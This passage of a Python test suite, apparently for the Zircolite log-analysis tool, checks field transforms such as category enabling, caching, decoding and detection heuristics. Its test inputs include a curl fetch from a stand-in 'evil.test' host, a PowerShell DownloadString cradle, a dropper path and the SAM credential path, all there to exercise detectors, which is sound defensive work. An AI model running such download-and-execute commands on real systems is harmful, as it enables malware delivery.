                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return 't2:' + param",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                    {"info": "t3", "type": "python",
                     "code": "def transform(param): return 't3:' + param",
                     "alias": True, "alias_name": "T3",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": [],
            "transform_categories": {
                "cat_a": ["T1", "T2"],
                "cat_b": ["T3"],
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Enable just cat_a
        args = make_args_config("json_input")
        args.transform_categories = ["cat_a"]
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set
        assert "T3" not in processor.enabled_transforms_set

    def test_transform_category_multiple_categories(self, tmp_path, test_logger):
        """Test that multiple --transform-category flags combine."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return 't1'",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return 't2'",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": [],
            "transform_categories": {
                "cat_a": ["T1"],
                "cat_b": ["T2"],
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = make_args_config("json_input")
        args.transform_categories = ["cat_a", "cat_b"]
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set

    def test_transform_category_unknown_warns(self, tmp_path, test_logger):
        """Test that unknown category name logs a warning."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {},
            "enabled_transforms": [],
            "transform_categories": {"cat_a": ["T1"]}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = make_args_config("json_input")
        args.transform_categories = ["nonexistent"]
        # Should not raise, just warn
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert processor.transforms_enabled is True

    def test_transform_category_merges_with_existing(self, tmp_path, test_logger):
        """Test that --transform-category merges with existing enabled_transforms."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return 't1'",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return 't2'",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": ["T1"],  # T1 already enabled
            "transform_categories": {
                "cat_b": ["T2"],
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = make_args_config("json_input")
        args.transform_categories = ["cat_b"]
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        # Both T1 (from enabled_transforms) and T2 (from category) should be enabled
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set


class TestTransformCaching:
    """Tests for transform function caching."""

    def test_transform_func_cached(self, field_mappings_file_multi, test_logger, args_config_json_input):
        """Test that transform functions are properly cached."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_json_input,
            logger=test_logger
        )

        code = "def transform(param):\n    return param.upper()"

        # First call - should compile and cache
        func1 = processor._get_transform_func(code)
        assert func1 is not None

        # Second call - should return cached function
        func2 = processor._get_transform_func(code)
        assert func2 is func1  # Same object reference

        # Verify it works
        assert func1("hello") == "HELLO"

    def test_bytecode_cached(self, field_mappings_file_multi, test_logger, args_config_json_input):
        """Test that compiled bytecode is cached."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_json_input,
            logger=test_logger
        )

        code = "def transform(param):\n    return param.lower()"

        # Clear caches
        processor.compiled_code_cache.clear()
        processor._transform_func_cache.clear()

        # First call
        processor._get_transform_func(code)
        assert code in processor.compiled_code_cache

        # Bytecode should be cached
        bytecode = processor.compiled_code_cache[code]
        processor._get_transform_func(code)
        assert processor.compiled_code_cache[code] is bytecode


class TestHexToAsciiTransform:
    """Tests for hex to ASCII transformation (used in auditd logs)."""

    def test_hex_to_ascii_transform(self, tmp_path, test_logger):
        """Test hex to ASCII transformation for proctitle."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "proctitle": [{
                    "info": "Proctitle HEX to ASCII",
                    "type": "python",
                    "code": "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00', ' ')",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["auditd_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = Namespace(evtx_input=False, json_input=False, auditd_input=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )

        # "ls -la" in hex: 6c73002d6c61
        result = processor._transform_value(
            "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00', ' ')",
            "6c73002d6c61"
        )
        assert result == "ls -la"

    def test_invalid_hex_returns_original(self, tmp_path, test_logger):
        """Test that invalid hex returns original value."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = Namespace(evtx_input=False, json_input=False, auditd_input=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    return bytes.fromhex(param).decode('ascii')",
            "not_valid_hex"
        )
        # Should return original on error
        assert result == "not_valid_hex"


class TestEdgeCases:
    """Tests for edge cases in transforms."""

    def test_transform_with_none_value(self, tmp_path, test_logger):
        """Test transform behavior with None values."""
        config = {
            "exclusions": [],
            "useless": [],  # Don't filter None
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Handle None",
                    "type": "python",
                    "code": "def transform(param):\n    return 'was_none' if param is None else param",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = Namespace(evtx_input=False, json_input=True, auditd_input=False)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    return 'was_none' if param is None else param",
            None
        )
        assert result == "was_none"

    def test_transform_with_special_characters(self, tmp_path, test_logger):
        """Test transform with special characters."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = Namespace(evtx_input=False, json_input=True, auditd_input=False)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )

        # Test with unicode
        result = processor._transform_value(
            "def transform(param):\n    return param.upper()",
            "héllo wörld 日本語"
        )
        assert result == "HÉLLO WÖRLD 日本語"

        # Test with escape sequences
        result = processor._transform_value(
            "def transform(param):\n    return param.replace('\\n', ' ')",
            "line1\nline2"
        )
        assert result == "line1 line2"

    def test_transform_with_very_long_string(self, tmp_path, test_logger):
        """Test transform with very long string input."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = Namespace(evtx_input=False, json_input=True, auditd_input=False)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )

        long_string = "a" * 100000
        result = processor._transform_value(
            "def transform(param):\n    return str(len(param))",
            long_string
        )
        assert result == "100000"


class TestEnabledTransformsList:
    """Tests for the enabled_transforms list feature."""

    def test_enabled_transforms_list_controls_which_transforms_run(self, tmp_path, test_logger):
        """Test that only transforms in enabled_transforms list are executed."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            # Only enable Transform_A, not Transform_B
            "enabled_transforms": ["Transform_A"],
            "transforms": {
                "TestField": [
                    {
                        "info": "Transform A",
                        "type": "python",
                        "code": "def transform(param):\n    return 'A:' + param",
                        "alias": True,
                        "alias_name": "Transform_A",
                        "source_condition": ["json_input"],
                        "enabled": True  # This flag is ignored when enabled_transforms list exists
                    },
                    {
                        "info": "Transform B",
                        "type": "python",
                        "code": "def transform(param):\n    return 'B:' + param",
                        "alias": True,
                        "alias_name": "Transform_B",
                        "source_condition": ["json_input"],
                        "enabled": True  # This flag is ignored when enabled_transforms list exists
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"TestField": "value"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)

        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1

        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs")
        columns = [desc[0] for desc in cursor.description]

        # Transform_A should be present (in enabled list)
        assert "Transform_A" in columns

        # Transform_B should NOT be present (not in enabled list)
        assert "Transform_B" not in columns

        conn.close()

    def test_enabled_transforms_matches_field_name_for_non_alias_transforms(self, tmp_path, test_logger):
        """Non-alias transforms (alias_name='') are named by their field in enabled_transforms.

        Regression: the default config lists 'proctitle'/'cmd' (field names) but the
        hot path only matched alias_name, so those transforms never ran.
        """
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "enabled_transforms": ["proctitle"],
            "transforms": {
                "proctitle": [
                    {
                        "info": "Uppercase in place",
                        "type": "python",
                        "code": "def transform(param):\n    return param.upper()",
                        "alias": False,
                        "alias_name": "",
                        "source_condition": ["auditd_input"],
                        "enabled": True,
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"proctitle": "bash"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("auditd_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)

        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1

        cursor = conn.cursor()
        cursor.execute('SELECT "proctitle" FROM logs')
        row = cursor.fetchone()
        assert row[0] == "BASH"  # in-place transform ran

        conn.close()

    def test_all_transforms_enables_non_alias_transforms(self, tmp_path, test_logger):
        """--all-transforms must collect non-alias transforms by field name."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "enabled_transforms": [],  # nothing enabled by default
            "transforms": {
                "proctitle": [
                    {
                        "info": "Uppercase in place",
                        "type": "python",
                        "code": "def transform(param):\n    return param.upper()",
                        "alias": False,
                        "alias_name": "",
                        "source_condition": ["auditd_input"],
                        "enabled": True,
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"proctitle": "bash"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("auditd_input")
        args.all_transforms = True
        args.transform_categories = None
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)
        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1

        cursor = conn.cursor()
        cursor.execute('SELECT "proctitle" FROM logs')
        row = cursor.fetchone()
        assert row[0] == "BASH"

        conn.close()

    def test_empty_enabled_transforms_list_disables_all(self, tmp_path, test_logger):
        """Test that empty enabled_transforms list disables all transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "enabled_transforms": [],  # Empty list = no transforms
            "transforms": {
                "TestField": [{
                    "info": "Transform A",
                    "type": "python",
                    "code": "def transform(param):\n    return 'A:' + param",
                    "alias": True,
                    "alias_name": "Transform_A",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"TestField": "value"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)

        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1

        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs")
        columns = [desc[0] for desc in cursor.description]

        # No transforms should run
        assert "Transform_A" not in columns

        conn.close()

    def test_missing_enabled_transforms_disables_all(self, tmp_path, test_logger):
        """Test that missing enabled_transforms list disables all transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            # No enabled_transforms list - all transforms disabled
            "transforms": {
                "TestField": [
                    {
                        "info": "Transform A",
                        "type": "python",
                        "code": "def transform(param):\n    return 'A:' + param",
                        "alias": True,
                        "alias_name": "Transform_A",
                        "source_condition": ["json_input"]
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"TestField": "value"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)

        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1

        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs")
        columns = [desc[0] for desc in cursor.description]

        # Without enabled_transforms list, transforms fall back to their individual
        # enabled flag (True by default), so Transform_A should run
        assert "Transform_A" in columns

        conn.close()


class TestStreamingProcessorTransformsEndToEnd:
    """End-to-end tests for transforms in StreamingEventProcessor."""

    def test_streaming_with_transforms_creates_alias_field(self, tmp_path, test_logger):
        """Test that streaming processor creates alias fields from transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "enabled_transforms": ["CommandLine_Upper"],  # Enable via list
            "transforms": {
                "CommandLine": [{
                    "info": "Uppercase CommandLine",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": True,
                    "alias_name": "CommandLine_Upper",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"CommandLine": "powershell.exe -c whoami"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)

        count = processor.process_file_streaming(conn, str(json_file), input_type='json')

        assert count == 1

        cursor = conn.cursor()
        cursor.execute("SELECT CommandLine, CommandLine_Upper FROM logs")
        row = cursor.fetchone()

        assert row[0] == "powershell.exe -c whoami"
        assert row[1] == "POWERSHELL.EXE -C WHOAMI"

        conn.close()


class TestRealConfigTransforms:
    """End-to-end tests loading the shipped config/config.yaml."""

    def test_default_config_enables_auditd_proctitle_transform(self, tmp_path, test_logger):
        """The default enabled_transforms list must actually run proctitle decoding.

        Regression: enabled_transforms lists field names ('proctitle') but the hot
        path matched only alias_name (''), so the shipped defaults never ran.
        """
        config_path = Path(__file__).parent.parent / "config" / "config.yaml"
        args = make_args_config("auditd_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_path),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger,
        )

        event = {"proctitle": "62617368"}  # hex for 'bash'
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)
        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1

        cursor = conn.cursor()
        cursor.execute('SELECT "proctitle" FROM logs')
        row = cursor.fetchone()
        assert row[0] == "bash"
        conn.close()


# =============================================================================
# The transforms Zircolite actually ships
# =============================================================================

@pytest.fixture(scope="module")
def real_config():
    """The shipped config/config.yaml, parsed."""
    path = Path(__file__).parent.parent / "config" / "config.yaml"
    return yaml.safe_load(path.read_text())


def _normalise(code: str) -> str:
    """Compare transform bodies ignoring indentation and blank lines."""
    return "".join(code.split())


TRANSFORMS_DIR = Path(__file__).parent.parent / "config" / "transforms"
SHIPPED_TRANSFORMS = sorted(p.name for p in TRANSFORMS_DIR.glob("*.py"))

# Values chosen to exercise the awkward paths: empty, whitespace, no separator,
# not-hex, not-base64, and something long enough to trip a length bucket.
PROBE_VALUES = [
    "",
    "   ",
    "abc",
    "0",
    "notthex",
    "C:\\Windows\\System32\\cmd.exe /c whoami",
    "/usr/bin/env python3 -c 'x'",
    "CORP\\alice",
    "www.example.com",
    "1.2.3.4",
    "445",
    "%TEMP%\\dropper.exe",
    "a" * 1200,
]

_MD5 = "d41d8cd98f00b204e9800998ecf8427e"
_SHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
# "This is a longer secret string" -- long enough to clear the decoder's
# minimum length and false-positive guards
_B64 = "VGhpcyBpcyBhIGxvbmdlciBzZWNyZXQgc3RyaW5n"
_B64_PLAIN = "This is a longer secret string"

# (transform file, input, expected output)
TRANSFORM_EXPECTATIONS = [
    # -- length and entropy buckets --
    ("commandline_length.py", "short", "SHORT:5"),
    ("commandline_length.py", "a" * 250, "LONG:250"),
    ("commandline_length.py", "a" * 600, "VERY_LONG:600"),
    ("commandline_length.py", "a" * 1200, "EXTREME:1200"),
    # -- hashes --
    ("hash_md5.py", f"MD5={_MD5},SHA256={_SHA256}", _MD5),
    ("hash_md5.py", "no hashes here", ""),
    ("hash_sha256.py", f"MD5={_MD5},SHA256={_SHA256}", _SHA256),
    # -- base64 --
    ("commandline_b64decoded.py", f"powershell -enc {_B64}", _B64_PLAIN),
    ("commandline_b64decoded.py", "nothing encoded", ""),
    ("scriptblocktext_b64decoded.py", f"$x = '{_B64}'", _B64_PLAIN),
    ("payload_b64decoded.py", _B64, _B64_PLAIN),
    ("servicefilename_b64decoded.py", _B64, _B64_PLAIN),
    # -- decoding --
    ("targetfilename_urldecoded.py", "C%3A%5Ctemp%5Cx.txt", "C:\\temp\\x.txt"),
    ("targetfilename_urldecoded.py", "plain.txt", ""),
    ("cmd_cmd_hex_to_ascii.py", "6C73202D6C61", "ls -la"),
    ("cmd_cmd_hex_to_ascii.py", "notthex", "notthex"),
    ("proctitle_proctitle_hex_to_ascii.py", "6C73202D6C61", "ls -la"),
    # -- path and name splitting; empty means "adds nothing over the source" --
    ("image_exename.py", "C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
    ("image_exename.py", "cmd.exe", ""),
    ("parentimage_exename.py", "C:\\Windows\\explorer.exe", "explorer.exe"),
    ("user_domain.py", "CORP\\alice", "CORP"),
    ("user_domain.py", "alice", ""),
    ("user_name.py", "CORP\\alice", "alice"),
    ("queryname_tld.py", "www.example.com", "com"),
    ("queryname_tld.py", "localhost", ""),
    # -- classification --
    ("destinationport_category.py", "445", "SMB"),
    ("destinationport_category.py", "80", "HTTP"),
    ("destinationport_category.py", "65000", "EPHEMERAL"),
    ("logontype_description.py", "3", "NETWORK"),
    ("logontype_description.py", "10", "REMOTE_INTERACTIVE"),
    ("logontype_description.py", "99", "UNKNOWN:99"),
    # -- detection heuristics --
    ("targetfilename_doubleextension.py", "invoice.pdf.exe", "DOUBLE_EXT:pdf.exe"),
    ("targetfilename_sensitivefile.py", "C:\\Windows\\System32\\config\\SAM",
     "SENSITIVE:CREDENTIAL_STORE"),
    ("image_lolbinmatch.py", "C:\\Windows\\System32\\certutil.exe", "LOLBIN:certutil"),
    ("image_typosquatdetect.py", "C:\\Temp\\svch0st.exe",
     "TYPOSQUAT:svchost(HOMOGLYPH)"),
    ("commandline_urls.py", "curl http://evil.test/a.ps1 -o b.ps1",
     "http://evil.test/a.ps1"),
    ("commandline_downloadcradle.py",
     "powershell IEX(New-Object Net.WebClient).DownloadString('http://x/y')",
     "DOWNLOADSTRING|WEBCLIENT"),
]


@pytest.fixture(scope="module")
def shipped_processor():
    """Processor built from the real config, for running shipped transforms."""
    args = argparse.Namespace(all_transforms=False, transform_categories=None)
    return StreamingEventProcessor(
        config_file=str(Path(__file__).parent.parent / "config" / "config.yaml"),
        args_config=args,
    )


class TestShippedTransformsAreWired:
    """config/config.yaml and config/transforms/ must not drift apart."""

    def test_there_are_transforms_to_test(self):
        assert len(SHIPPED_TRANSFORMS) > 40

    def test_every_referenced_file_exists(self, real_config):
        for category, items in (real_config.get("transforms") or {}).items():
            for entry in items:
                if entry.get("type") != "python_file":
                    continue
                name = entry["file"]
                assert (TRANSFORMS_DIR / name).is_file(), f"{category}: {name}"

    def test_unreferenced_files_still_match_their_inline_twin(self, real_config):
        """A file no entry loads is dead weight unless it mirrors an inline one.

        config.yaml keeps exactly one transform inline as a worked example of
        `type: python`, and ships the same code as a file. Two copies can
        drift, so if one exists it has to stay identical to the other.
        """
        referenced = {
            entry["file"]
            for items in (real_config.get("transforms") or {}).values()
            for entry in items
            if entry.get("type") == "python_file"
        }
        inline_bodies = [
            _normalise(entry["code"])
            for items in (real_config.get("transforms") or {}).values()
            for entry in items
            if entry.get("type") == "python" and entry.get("code")
        ]

        for orphan in sorted(set(SHIPPED_TRANSFORMS) - referenced):
            body = _normalise((TRANSFORMS_DIR / orphan).read_text())
            assert body in inline_bodies, (
                f"{orphan} is loaded by nothing and matches no inline transform"
            )


def _string_literals(source: str, first_line: int, last_line: int) -> list[str]:
    """Single-quoted literals between two 1-based line numbers."""
    body = "\n".join(source.splitlines()[first_line - 1:last_line])
    return re.findall(r"'([^']*)'", body)


def _typosquat_source() -> str:
    return (TRANSFORMS_DIR / "image_typosquatdetect.py").read_text()


def _typosquat_block(marker: str, end_marker: str) -> list[str]:
    source = _typosquat_source()
    lines = source.splitlines()
    start = next(i for i, line in enumerate(lines, 1) if marker in line)
    end = next(i for i, line in enumerate(lines[start:], start + 1) if end_marker in line)
    return _string_literals(source, start, end)


class TestTyposquatDetectDataIsReachable:
    """Data the typosquat transform can never act on is a silent gap.

    Every entry here is looked up against a value the code has already
    lower-cased, or compared against a length floor the code enforces itself.
    An entry on the wrong side of either is dead weight that reads as coverage.
    """

    def test_no_target_is_below_the_length_floor(self):
        """Targets shorter than the floor are skipped before comparison."""
        source = _typosquat_source()
        floor = int(re.search(r"if len\(target\) < (\d+):", source).group(1))
        targets = _typosquat_block("typosquat_targets = [", "]")
        unreachable = sorted({t for t in targets if len(t) < floor})
        assert unreachable == [], (
            f"these typosquat targets are never compared, the loop skips "
            f"anything under {floor} characters: {unreachable}"
        )

    def test_whitelist_is_lower_case(self):
        """`exe_name` is lower-cased before the lookup, so entries must be too."""
        source = _typosquat_source()
        assert ".lower()" in source
        entries = _typosquat_block("legit_whitelist = set([", "] + typosquat_targets)")
        mixed = sorted({w for w in entries if w != w.lower()})
        assert mixed == [], (
            f"these whitelist entries can never match a lower-cased exe name: {mixed}"
        )

    def test_whitelisted_names_are_not_flagged(self, shipped_processor):
        """The whitelist is what keeps legitimate binaries out of the report."""
        code = _typosquat_source()
        for name in ("RuntimeBroker", "runtimebroker", "wevtutil", "cmd", "wmic"):
            value = f"C:\\Windows\\System32\\{name}.exe"
            assert shipped_processor._transform_value(code, value) == "", (
                f"{name} is whitelisted but was flagged as a typosquat"
            )

    def test_every_reported_technique_is_named(self, shipped_processor):
        """A finding must say which technique fired, never an empty bracket."""
        code = _typosquat_source()
        for value in ("svch0st.exe", "1sass.exe", "chr0me.exe", "svchosts.exe",
                      "explore.exe", "powershel.exe"):
            result = shipped_processor._transform_value(code, value)
            if not result:
                continue
            for finding in result.split("|"):
                technique = finding.partition("(")[2].rstrip(")")
                assert technique, f"{value} produced a finding with no technique: {finding}"


@pytest.mark.parametrize("transform_file", SHIPPED_TRANSFORMS)
class TestShippedTransformsAreRobust:
    """Every shipped transform runs under the sandbox on awkward input.

    A transform that raises is swallowed by the flattener, which silently
    drops the field, so crash-safety is the property that matters most.
    """

    def test_compiles_and_survives_every_probe(
        self, transform_file, shipped_processor
    ):
        code = (TRANSFORMS_DIR / transform_file).read_text()

        # Deliberately not through _transform_value: that returns the input
        # unchanged on any exception, so a crashing transform would look like
        # a transform that simply had nothing to add.
        func = shipped_processor._get_transform_func(code)
        assert func is not None, f"{transform_file} did not compile"

        for value in PROBE_VALUES:
            try:
                result = func(value)
            except Exception as exc:
                pytest.fail(
                    f"{transform_file} raised {type(exc).__name__} on {value!r}: {exc}"
                )
            assert result is None or isinstance(result, str), (
                f"{transform_file} returned {type(result).__name__} for {value!r}"
            )

    def test_defines_the_expected_entry_point(self, transform_file):
        code = (TRANSFORMS_DIR / transform_file).read_text()
        assert "def transform(param)" in code


@pytest.mark.parametrize(
    "transform_file,value,expected",
    TRANSFORM_EXPECTATIONS,
    ids=[f"{t.removesuffix('.py')}-{i}" for i, (t, _, _) in enumerate(TRANSFORM_EXPECTATIONS)],
)
def test_shipped_transform_output(
    transform_file, value, expected, shipped_processor
):
    """Pin the behaviour of the transforms with well-defined semantics.

    These load the shipped file rather than a copy, so editing
    config/transforms/ is what makes them fail.
    """
    code = (TRANSFORMS_DIR / transform_file).read_text()
    assert shipped_processor._transform_value(code, value) == expected
